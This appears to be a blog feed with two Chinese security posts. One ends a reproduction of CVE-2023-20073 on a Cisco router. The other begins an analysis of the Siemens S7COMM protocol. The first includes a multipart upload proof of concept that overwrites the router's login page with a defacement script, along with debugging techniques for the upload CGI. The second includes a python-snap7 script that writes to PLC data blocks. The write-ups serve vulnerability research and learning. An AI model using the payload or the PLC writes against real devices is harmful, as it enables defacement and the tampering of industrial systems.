<p>此时刷新路由器登录界面，发现已经被篡改掉了（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011500528.png" alt="image-20230801150004288" style="zoom:67%;" />

<h3 id="控制file-path字段-方法二"><a href="#控制file-path字段-方法二" class="headerlink" title="控制file.path字段-方法二"></a>控制file.path字段-方法二</h3><p>这里是 <strong>winmt</strong> 师傅使用的一种比较优雅控制 <code>file.path</code> 的方法，上面提到的方法 <code>file.path</code> 字段是我们主动发过去的，其实报文会根据配置文件来自动来添加一个 <code>xxx.path</code> ，配置文件分析这里其实就说了这个地方（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011519087.png" alt="image-20230801151915836"></p>
<p>这里的 <code>$upload_file_name</code> 就是报文中 <code>Content-Disposition: form-data; name=&quot;what&quot;;filename=&quot;login.html&quot;</code> 的 <code>name</code> 字段，然后在 <code>upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;</code> 这行代码，会把上传文件的路径记录到这个 <code>xxx.path</code> 字段，这个 <code>xxx</code> 也就是上面的 <code>name</code> 字段的值。</p>
<p>验证的话，只需要看一下上面那次 <code>POST</code> 报文的数据就会发现 <code>what.path</code> 字段的值就是 <code>/tmp/upload/00000000001</code>  （如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011536829.png" alt="image-20230801153655724"></p>
<p>所以实际上报文也可以这么写（如下），这样不需要手动传入 <code>file.path</code> 字段，这个的优点是不知道文件的上传路径依然也能够攻击成功。这次就不再调试了，执行流什么的和上面一样</p>
<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;title&gt;The website has been hacked!&lt;/title&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;The website has been hacked&#x27;)&lt;/script&gt;</span><br><span class="line">------------	</span><br></pre></td></tr></table></figure>

<p>攻击效果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011549144.png" alt="image-20230801154927968"></p>
<h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><p>因为 <code>upload.cgi</code> 进程被调用是一闪而逝的，想正常查看进程号来附加进程调试是不可能的，所以下面介绍三种可以调试 <code>upload.cgi</code> 的方法</p>
<h4 id="方法1-爆破"><a href="#方法1-爆破" class="headerlink" title="方法1-爆破"></a>方法1-爆破</h4><p>这个原理很好理解，就是写一个 <code>shell</code> 脚本不断的去捕获 <code>upload.cgi</code> 进程号，如果捕获到了就立刻去执行 <code>gdbserver</code> ，缺点是全凭概率，大概率是捕获不到的（感觉有三成的几率用循环能捕获到该进程），并且没法控制断点位置，因为我们无法干预捕获到进程号并加载调试的时间，有可能 <code>upload.cgi</code> 都快执行完才加载上去啥的，就随机性很大，大概率看不到自己想要的，但也算是一种调试方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while true; do</span><br><span class="line">PID=$(pidof upload.cgi)</span><br><span class="line">if [ -n &quot;$PID&quot; ]; then</span><br><span class="line">  echo &quot;upload.cgi process ID is：$PID&quot;</span><br><span class="line">  ./gdbserver 0.0.0.0:9999 --attach $PID</span><br><span class="line">else</span><br><span class="line">  echo &quot;No get upload.cgi process ID&quot;</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>使用上面的爆破脚本开始运行，然后 <code>gdb</code> 执行 <code>target remote 192.168.45.66:9999</code> ，接着发送报文，此时会触发 <code>upload.cgi</code> 进程，如果运气好的话爆破脚本此时正好会捕捉到进程号，开启调试</p>
<p>下图为爆破成功的情况</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011702409.png" alt="image-20230801170242715"></p>
<h4 id="方法2-死循环"><a href="#方法2-死循环" class="headerlink" title="方法2-死循环"></a>方法2-死循环</h4><p>该方法对于这种 <code>fork</code> 子进程启动 <code>cgi</code> 最稳定的调试方法 – 也是 <strong>winmt</strong> 最爱的调试方法 😎</p>
<p>在 <code>upload.cgi</code> 的 <code>main</code> 函数起始位置，将首次进行跳转的指令给改成跳到本条指令地址的指令，使程序陷入死循环</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011058828.png" alt="image-20230801105851693"></p>
<p>上面 <code>getenv</code> 函数跳转时，正常的汇编代码应该如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011100923.png" alt="image-20230801110045838"></p>
<p>然后现在把 <code>0x10E0C</code> 这个地址存放的指令 <code>BL getenv</code> 改成 <code>B 0x10E0C</code> 这样就可以让进程 <code>upload.cgi</code> 陷入死循环（使用插件 <code>keypatch</code> 进行修改）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011102814.png" alt="image-20230801110224722"></p>
<p>此时改完之后查看伪代码应该是这样的，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011104021.png" alt="image-20230801110405979"></p>
<p>然后将 <code>patch</code> 完的文件保存后，放到 <code>/www/cgi-bin</code> 目录下（记得把原本正常的 <code>upload.cgi</code> 备份），直接重启 <code>nginx</code> 服务，然后发送攻击报文的话，路由器的界面会出现 <code>502</code> 错误（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307291336669.png" alt="image-20230729133639500" style="zoom:67%;" />

<p> <code>nginx</code> 服务本身会报一个 <code>Permission denied</code> 的错误，这是因为传进来的 <code>upload.cgi</code> 属于 <code>root</code> 用户，但是启动 <code>upload.cgi</code> 进程的用户是 <code>www-data</code>（<code>ps -ef</code> 可以查看），它的 <code>uid</code> 是 <code>33</code>，权限不够。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307291337395.png" alt="image-20230729133739275"></p>
<p><strong>解决方法是把其他用户组的访问权限设置为 <code>7</code></strong> ，这里图方便直接执行了 <code>chmod 777 upload.cgi </code>（之前我还纳闷为什么可以成功的单独运行 upload.cgi 程序，却服务启动的时候说权限不够，现在知道了单独运行 <code>upload.cgi</code> 是因为执行的用户本身就是 <code>root</code> ，以前对于 <code>linux</code> 上的权限设置有些一知半解，这里要特别感谢 <strong>winmt</strong> 师傅帮我解决了这个问题并且还要感谢我的同学 <a href="https://www.timochan.cn/">timochan</a> 帮助我彻底理解了这里）</p>
<p>然后重启 <code>nginx</code> 服务，发送攻击报文，此时正常的话服务是卡住的，访问路由器登录界面没反应，并且也能看到 <code>upload.cgi</code> 的进程号</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011240122.png" alt="image-20230801124042711" style="zoom:50%;" />

<p>用 <code>gdb.server + gdb</code> 实现远程调试 <a href="https://github.com/stayliv3/gdb-static-cross/blob/master/prebuilt/gdbserver-7.7.1-armhf-eabi5-v1-sysv">gdbserver 下载链接</a>  。下载后需要用 <code>scp</code> 传入到 <code>qemu</code> 中。执行命令 <code>./gdbserver 0.0.0.0:9999 --attach PID</code></p>
<p>在宿主机中执行 <code>sudo gdb-multiarch upload.cgi</code> 这里也设置 <code>upload.cgi</code> 是为了加载出来程序的符号</p>
<p>执行 <code>set endian little</code> 设置一下字节序，执行 <code>set architecture arm</code> 设置一下架构再执行  <code>target remote 192.168.45.66:9999</code> 就可以附加 <code>upload.cgi </code> 进程进行调试了。</p>
<p>一切正常的话，界面应该如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011250655.png" alt="image-20230801125049024"></p>
<p>因为我们通过 <code>patch</code> 让进程陷入了死循环，所以要用 <code>set</code> 命令给改回正常的指令，查看之前备份的 <code>upload.cgi</code> 文件，发现这里原本机器码为 <strong>AA FF FF EB</strong> ，因此执行 <code>set *0x10e0c=0xebffffaa</code> 命令（因为小端序，这里是反着输入的）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011315543.png" alt="image-20230801131504461" style="zoom:67%;" />



<p>至此就可以正常来调试 <code>upload.cgi</code> 进程（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307291350803.png" alt="image-20230729135054570"></p>
<p>还有一个坑，调试的时候会发现，调试几分钟，就会出现右下角的报错（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011254422.png" alt="image-20230801125411430"></p>
<p>原因是在 <code>uwsgi</code> 的配置文件中设置了时间限制（如下图），解决方法就把这个值改的很大即可</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308011322496.png" alt="image-20230801132239444" style="zoom:50%;" />



<h4 id="方法3-父进程"><a href="#方法3-父进程" class="headerlink" title="方法3-父进程"></a>方法3-父进程</h4><p>该方法在这里没有实验成功，但理论上可行。去找到调用 <code>upload.cgi</code> 的进程（也就是 <code>uwsgi -m --ini /etc/uwsgi/upload.ini</code> ），调试 <code>upload.cgi</code> 的父进程，等到 <code>fork</code> 创建子进程，切换到子进程，并用 <code>catch exec</code> 命令捕获新事件，在执行 <code>execvp</code> 后即可跳转到 <code>upload.cgi</code> 上调试（<code>upload.cgi</code> 进程会替代原本的子进程 ），理论上是这个样子。失败原因：<code>gdb</code> 加载进程调试后，似乎出现了一些问题。第一是 <code>fork</code> 后子进程没出来（<code>gdb</code> 上看不到）；第二 <code>execvp</code> 这里执行后不支持 <code>catch exec</code> ；第三是 <code>gdb</code> 挂上来后，有些指令会导致进程的崩溃</p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p><strong>CVE-2023-20073</strong> 的复现结束了，在这个过程中有过惊喜、不解、困惑各样的情绪。还记得当时我做了两天，启动服务这块还是失败的。后来用的网上找的内核镜像和磁盘映像文件（里面有一个老版本固件解出来的文件系统），直到整个复现过程的结束，我用的都不是自己解压出来的文件系统。这个点一个星期都在抽空不断的尝试，但都没有成功。第八天，不知什么时候我尝试了 <code>scp</code> 应该传压缩后的文件系统，并且 <code>binwalk</code> 要保留文件的软链接，这一次我成功将服务启动成功，用的是我自己解压出来的最新固件。当时我给 <strong>winmt</strong> 说现在的心情就和中了五百万一样，可实际上我只不过是成功的解压了一个固件启动了服务而已，这种心情很奇怪，可能只有各位亲自遇见了困扰自己许久的问题最终还是被自己给解决掉才能体会到（也不希望各位花费一个星期只为体会到这种心情，哈哈~）</p>
<p>如果结尾只写一句话的话，应该是 “感谢 <strong>winmt</strong> 和坚持的 <strong>ZIKH26</strong> ，他教会了我很多，不止技术，还有态度” 🤩</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.iotsec-zone.com/article?id=383">思科企业级路由器0day漏洞挖掘（水漏洞版）- IOTsec-Zone物联网安全社区</a></p>
<p><a href="https://blog.csdn.net/Reasonss/article/details/124420016">(57条消息) 解压UBI格式文件_解压ubi文件_老王-嵌入式linux的博客-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/e512a7127f2d">Nginx upload上传模块(学习笔记十七) - 简书 (jianshu.com)</a></p>
<p><a href="https://www.cnblogs.com/jinjin666/archive/2013/01/29/2881772.html">nginx文件上传模块+Tonado - 浪迹天涯cc - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>复现CVE</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
      </tags>
  </entry>
  <entry>
    <title>抓取和分析西门子S7COMM协议</title>
    <url>/posts/d808b199.html</url>
    <content><![CDATA[<p>近期在初步入门工控安全，进行了第一次协议分析，本文将介绍如何对 <code>S7COMM</code> 协议进行从零到一的分析。</p>
<span id="more"></span>

<p>因为是纯小白，加上几乎没人指引，又由于 <code>S7COMM</code> 是西门子的私有协议，本文的编写全靠个人的分析与网上的资料参考，无法保证编写的内容全部准确。</p>
<h3 id="如何抓取到-S7COMM-协议"><a href="#如何抓取到-S7COMM-协议" class="headerlink" title="如何抓取到 S7COMM 协议"></a>如何抓取到 S7COMM 协议</h3><p>要想对一个协议进行分析，必须先能抓取到该协议。这里我目前尝试了两种方法，第一种是使用 <code>Snap7</code> 模拟器，优点是快捷，方便；第二种是搭建一整套仿真环境，优点是很充分的模拟出真实环境，如果还需要进行除协议外的其他研究，可能需要搭建出一套仿真环境。如果有设备的话，那就更加方便和真实了（不过我没有，所以这种情况就不做记录了）</p>
<h4 id="使用-Snap7-模拟器抓取S7协议"><a href="#使用-Snap7-模拟器抓取S7协议" class="headerlink" title="使用 Snap7 模拟器抓取S7协议"></a>使用 <code>Snap7</code> 模拟器抓取S7协议</h4><p>关于下载和基本使用的话，这篇 <a href="https://blog.csdn.net/weixin_44112083/article/details/130627005">文章</a> 介绍的很清晰，下面直接介绍用 <code>Wireshark</code> 如何在 <code>Snap7</code> 模拟器上抓取到 <code>S7COMM</code> 流量包</p>
<p>这里直接写成 <code>0.0.0.0</code> ，然后点 <code>Start</code> 如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191007869.png" alt="image-20230719100703797" style="zoom: 80%;" />



<p>然后这里选择 <code>127.0.0.1</code> ，点击 <code>Connect</code> 如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191008419.png" alt="image-20230719100847381" style="zoom:80%;" />

<p><code>Wireshark</code> 中选择这个 <code>Adapter for loopback traffic capture</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191010148.png" alt="image-20230719101031104"></p>
<p>以向 <code>PLC</code> 发出 <code>wirte</code> 请求为例，我们在客户端做如下设置，然后点击 <code>write</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191032768.png" alt="image-20230719103232717" style="zoom:80%;" />



<p>请求发出后，我们用 <code>Wireshark</code> 就能抓取到这个数据包了，这里用 <code>cotp</code> 来过滤一下。这里只介绍协议的抓取，后面再做协议分析</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191039851.png" alt="image-20230719103942675"></p>
<h4 id="在仿真环境抓取S7协议"><a href="#在仿真环境抓取S7协议" class="headerlink" title="在仿真环境抓取S7协议"></a>在仿真环境抓取S7协议</h4><p>具体的搭建环境过程请参考这篇 <a href="https://zhuanlan.zhihu.com/p/304315391">文章</a> ，仿真软件的话我用的是 <code>S7-PLCSIM Advanced v3.0</code>，这里只介绍环境搭建后如何用 <code>Wireshark</code> 抓取到 <code>S7COMM</code> 流量包（如果安装不熟练的话，建议安装在虚拟机里面，笔记本能吃得消的话，内存最好配置成 <code>16G</code> ，不然会很卡 ）</p>
<p>首先从控制面板里找到更改适配器这里，然后点击以太网的属性（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191738970.png" alt="image-20230719173807624"></p>
<p>然后点击下面的版本协议</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191739563.png" alt="image-20230719173918379"></p>
<p>然后把 <code>IP</code> 配置成 <code>192.168.0.100</code> （也不是非要跟我这个一样）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191740018.png" alt="image-20230719174001810"></p>
<p>打开 <code>S7-PLCSIM Advanced v3.0</code> 仿真工具，然后配置就跟图上标注的一样即可，最后点击 <code>Start</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191743980.png" alt="image-20230719174308726"></p>
<p>此时正常效果应该是如下，有个黄色的灯亮了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191747601.png" alt="image-20230719174707349"></p>
<p>接下来配置博途，点这个创建新项目，项目名称随便取即可，最后点创建</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191749803.png" alt="image-20230719174904709"></p>
<p>点击打开项目视图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191750478.png" alt="image-20230719175012377"></p>
<p>这里来添加新设备，随便选中一个 <code>1500</code> 型号的 <code>CPU</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191751912.png" alt="image-20230719175103790"></p>
<p>正常的话，应该会出现如下界面，点击红框中的这个地方，来配置<code>PLC</code> 的 <code>IP</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191752627.png" alt="image-20230719175230535"></p>
<p>这里的 <code>IP</code> 一定要和仿真工具里面配置的 <code>IP</code> 一样（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191753023.png" alt="image-20230719175341919"></p>
<p>下面这里需要选中 <strong>允许来自远程对象的 PUT&#x2F;GET通信访问</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191755121.png" alt="image-20230719175551017"></p>
<p>下面创建一个 <code>DB</code> 块</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191757599.png" alt="image-20230719175712502"></p>
<p>然后点击这个 <code>DB</code> 块，写入信息如下图所示（至于变量类型和个数都无所谓，这里只是做一个演示）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191758062.png" alt="image-20230719175829938"></p>
<p>右键 <code>DB</code> 块，点击属性，然后就能看到下面的配置。把 <strong>优化的块访问</strong> 选项给取消掉</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307191800125.png" alt="image-20230719180031028"></p>
<p>项目这里，也就是下图的 <strong>抓取流量测试</strong> 的位置，右键选择属性，在保护这一栏勾选 <strong>块编译时支持仿真</strong> 选项</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200928916.png" alt="image-20230720092822790" style="zoom:80%;" />



<p>接下来进行编译和下载，依次点击下面的 <strong>编译</strong> 和 <strong>下载到设备</strong> ，选中和图中一样的接口类型和接口（似乎默认就是这样），最后点击开始搜索  </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200932452.png" alt="image-20230720093250332"></p>
<p>如果前面的配置都正确的话，应该会出现下图的状态并且 <strong>下载</strong> 按钮也会亮起来（如果没亮的话，肯定是前面配置错了，大概率是 <code>PLC</code> 的 <code>IP</code> 和仿真工具中的 <code>IP</code> 或者以太网卡的 <code>IP</code> 没有配置好），点击 <strong>下载</strong> 按钮</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200935725.png" alt="image-20230720093505604"></p>
<p>正常的话，应该是要先点一下 <strong>装载</strong>，然后选择 <strong>启动模块</strong> ，点击 <strong>完成</strong>（如果跟下面一样，直接到这个界面的话，就不需要再管装载了，点击完成就行）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200937951.png" alt="image-20230720093750806"></p>
<p>至此全部完成的话，那么应该和下图一样，从之前的黄灯变成绿灯。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200939562.png" alt="image-20230720093953441"></p>
<p>并且也是能够直接 <code>ping</code> 通 <code>PLC</code> 的（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200941361.png" alt="image-20230720094130178"></p>
<p>最后我使用的是 <code>python</code> 中的 <code>snap7</code> 模块，对 <code>PLC</code> 发出读写请求。从而用 <code>Wireshark</code> 抓取通信时的流量，用 <code>S7COMM</code> 来过滤一下，可以发现成功的抓取到了 <code>S7COMM</code> 协议</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307200944230.png" alt="image-20230720094448068"></p>
<p>这里我写的脚本代码如下，如果没不太理解函数作用的话，可以阅读一下 <a href="https://python-snap7.readthedocs.io/en/latest/API/client.html?highlight=db_read#">官方文档</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> snap7</span><br><span class="line"><span class="keyword">from</span> snap7 <span class="keyword">import</span> util</span><br><span class="line">plc = snap7.client.Client()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接至PLC</span></span><br><span class="line">plc.connect(<span class="string">&#x27;192.168.0.11&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>)             </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;连接状态：  <span class="subst">&#123;plc.get_connected()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line">recv_data=plc.read_area(snap7.client.Areas.DB,<span class="number">1</span>,<span class="number">0</span>,<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line">list_data=[]</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(recv_data)),<span class="number">2</span>):</span><br><span class="line">    list_data.append(<span class="built_in">int</span>.from_bytes(recv_data[i:i+<span class="number">2</span>],byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The &#123;&#125; set of data parsed &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cnt,list_data[cnt]))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">num=<span class="built_in">bytearray</span>(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;write &#123;&#125; to DB.1 block offset of &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i*<span class="number">4</span>,i*<span class="number">2</span>))</span><br><span class="line">    util.set_int(num,<span class="number">0</span>,i*<span class="number">4</span>)</span><br><span class="line">    plc.db_write(<span class="number">1</span>,i*<span class="number">2</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line"><span class="comment">#plc.disconnect()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;连接状态：  <span class="subst">&#123;plc.get_connected()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<blockquote>
<p>因为是初学者，有一些问题在上网查过资料后没有找到想要的答案，在下面记录一下（希望有明白的朋友能告知一下）</p>
<ol>
<li>配置的 <code>PLC</code> 是 <code>S7-1500</code> ，为什么发出读写请求抓到的是 <code>S7COMM</code> 协议，而不是 <code>S7 COMM PLUS</code> 协议</li>
<li>除了用 <code>python</code> 脚本直接对 <code>PLC</code> 发出请求之外，还有哪些方式能抓取到与 <code>PLC</code> 通信的流量（我发现在 <code>TIA</code> 中的上传和下载也有通信的流量）</li>
<li><code>python-snap7</code> 给出了 <code>plc_stop()</code> 函数，该函数可以直接向 <code>PLC</code> 发出关机请求，我使用了之后发现没有用，是哪里进行了阻止呢？或者是仿真环境无法实现的原因？</li>
</ol>
</blockquote>
<h3 id="S7COMM协议分析"><a href="#S7COMM协议分析" class="headerlink" title="S7COMM协议分析"></a>S7COMM协议分析</h3><table>
<thead>
<tr>
<th>ISO-OSI参考模型</th>
<th>S7以太网协议模型</th>
</tr>
</thead>
<tbody><tr>
<td>7-应用层</td>
<td>6-S7 Communication</td>
</tr>
<tr>
<td>6-表示层</td>
<td>S7 communication(COTP)</td>
</tr>
<tr>
<td>5-会话层</td>
<td>S7 communication(TPKT)</td>
</tr>
<tr>
<td>4-传输层</td>
<td>3-TCP(102端口)</td>
</tr>
<tr>
<td>3-网络层</td>
<td>IP</td>
</tr>
<tr>
<td>2-数据链路层</td>
<td>1-工业以太网</td>
</tr>
<tr>
<td>1-物理层</td>
<td></td>
</tr>
</tbody></table>
<p>这里我用 <code>Snap7</code> 模拟器来抓取一个 <code>S7COMM</code> 的流量进行分析，先介绍一下 <code>Snap7</code> 客户端中的 <code>Area</code> <code>DB Number</code> <code>Start</code> <code>Amount</code> <code>WordLen</code> 这五部分（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307201000439.png" alt="image-20230720100018356" style="zoom: 67%;" />



<ol>
<li><p><code>Area</code> 表示数据区域类型，常见区域如下</p>
<table>
<thead>
<tr>
<th>Hex</th>
<th>Value</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>0x03</td>
<td>System info of 200 family</td>
<td>200系列系统信息</td>
</tr>
<tr>
<td>0x05</td>
<td>System flags of 200 family</td>
<td>200系列系统标志</td>
</tr>
<tr>
<td>0x06</td>
<td>Analog inputs of 200 family</td>
<td>200系列模拟量输入</td>
</tr>
<tr>
<td>0x07</td>
<td>Analog outputs of 200 family</td>
<td>200系列模拟量输出</td>
</tr>
<tr>
<td>0x80</td>
<td>Direct peripheral access (P)</td>
<td>直接访问外设</td>
</tr>
<tr>
<td>0x81</td>
<td>Inputs (I)</td>
<td>输入（I）</td>
</tr>
<tr>
<td>0x82</td>
<td>Outputs (Q)</td>
<td>输出（Q）</td>
</tr>
<tr>
<td>0x83</td>
<td>Flags (M)</td>
<td>内部标志（M）</td>
</tr>
<tr>
<td>0x84</td>
<td>Data blocks (DB)</td>
<td>数据块（DB）</td>
</tr>
<tr>
<td>0x85</td>
<td>Instance data blocks (DI)</td>
<td>背景数据块（DI）</td>
</tr>
<tr>
<td>0x86</td>
<td>Local data (L)</td>
<td>局部变量（L）</td>
</tr>
<tr>
<td>0x87</td>
<td>Unknown yet (V)</td>
<td>全局变量（V）</td>
</tr>
<tr>
<td>0x1c</td>
<td>S7 counters (C)</td>
<td>S7计数器（C）</td>
</tr>
<tr>
<td>0x1d</td>
<td>S7 timers (T)</td>
<td>S7定时器（T）</td>
</tr>
<tr>
<td>0x1e</td>
<td>IEC counters (200 family)</td>
<td>IEC计数器（200系列）</td>
</tr>
<tr>
<td>0x1f</td>
<td>IEC timers (200 family)</td>
<td>IEC定时器（200系列）</td>
</tr>
</tbody></table>
</li>
<li><p><code>DB Number</code> 代表数据块编号，如果访问的不是数据库则该位置为 <code>0</code></p>
</li>
<li><p><code>Start</code> 表示从指定数据块的起始位置写入数据，<code>Start</code> 为 <code>4</code> ，那么则会从编号为 <code>4</code>（第五个字节处）开始写入或读出数据</p>
</li>
<li><p><code>Amount</code> 表示写入或读出的数据量（这单位不一定是字节，取决于 <code>WordLen</code> 字段的类型）</p>
</li>
<li><p><code>WordLen</code> 表示单位长度，可以选择 <code>Byte</code> <code>Word</code> <code>DWord</code> 等等</p>
</li>
</ol>
<p>接下来点击 <code>Write</code> ，此时抓取一个 <code>S7COMM</code> 的报文</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111556216.png" alt="image-20230711155651147" style="zoom: 80%;" />



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111603513.png" alt="image-20230711160356351"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S7 Communication</span><br><span class="line">    Header: (Job)</span><br><span class="line">        Protocol Id: 0x32</span><br><span class="line">        ROSCTR: Job (1)</span><br><span class="line">        Redundancy Identification (Reserved): 0x0000</span><br><span class="line">        Protocol Data Unit Reference: 1792</span><br><span class="line">        Parameter length: 14</span><br><span class="line">        Data length: 44</span><br><span class="line">    Parameter: (Write Var)</span><br><span class="line">        Function: Write Var (0x05)</span><br><span class="line">        Item count: 1</span><br><span class="line">        Item [1]: (DB 1.DBX 4.0 WORD 20)</span><br><span class="line">            Variable specification: 0x12</span><br><span class="line">            Length of following address specification: 10</span><br><span class="line">            Syntax Id: S7ANY (0x10)</span><br><span class="line">            Transport size: WORD (4)</span><br><span class="line">            Length: 20</span><br><span class="line">            DB number: 1</span><br><span class="line">            Area: Data blocks (DB) (0x84)</span><br><span class="line">            Address: 0x000020</span><br><span class="line">                .... .000 0000 0000 0010 0... = Byte Address: 4</span><br><span class="line">                .... .... .... .... .... .000 = Bit Address: 0</span><br><span class="line">    Data</span><br><span class="line">        Item [1]: (Reserved)</span><br><span class="line">            Return code: Reserved (0x00)</span><br><span class="line">            Transport size: BYTE/WORD/DWORD (0x04)</span><br><span class="line">            Length: 40</span><br><span class="line">            Data: 010366778899000011000000000000000000000000000000000000ff0000000000000000…</span><br></pre></td></tr></table></figure>

<p><code>S7COMM</code> 的完整数据如上，下面针对 <code>Header</code> <code>Parameter</code> <code>Data</code> 三部分的各个字段分别做出解释</p>
<h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S7 Communication</span><br><span class="line">    Header: (Job)</span><br><span class="line">        Protocol Id: 0x32</span><br><span class="line">        ROSCTR: Job (1)</span><br><span class="line">        Redundancy Identification (Reserved): 0x0000</span><br><span class="line">        Protocol Data Unit Reference: 1792</span><br><span class="line">        Parameter length: 14</span><br><span class="line">        Data length: 44</span><br></pre></td></tr></table></figure>

